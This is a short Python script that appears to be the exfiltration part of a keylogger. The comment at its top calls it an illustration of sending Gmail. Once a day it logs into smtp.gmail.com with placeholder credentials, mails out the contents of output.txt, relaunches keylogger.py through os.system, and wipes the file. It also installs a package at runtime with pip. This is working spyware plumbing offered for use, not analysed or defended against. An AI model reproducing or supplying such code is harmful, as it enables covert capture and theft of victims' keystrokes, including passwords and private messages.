# Python code to illustrate Sending mail from 
# your Gmail account 
import smtplib

import time
import os
import datetime
import pip
pip.main(['install','schedule'])
import schedule
#import threading
#from apscheduler.schedulers.blocking import BlockingScheduler
#import subprocess
f=open('output.txt','w').close()


def sendmail():
# creates SMTP session
	s = smtplib.SMTP('smtp.gmail.com', 587)

	# start TLS for security
	s.starttls()

	# Authentication
	s.login("xyz@email.com", "abc")
	f=open('output.txt','r')

	# message to be sent
	message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"),f.read())
	print(message)

	# sending the mail
	s.sendmail("email@gmail.com", "xyz@gmail.com", message)

	# terminating the session
	s.quit()
	os.system('python keylogger.py')
	f.close()
	f=open('output.txt','w').close()

schedule.every().day.at("11:58").do(sendmail)
while True:
    schedule.run_pending()
    time.sleep(1)


#t2 = threading.Thread(target=task2)
#os.system("python keylogger.py")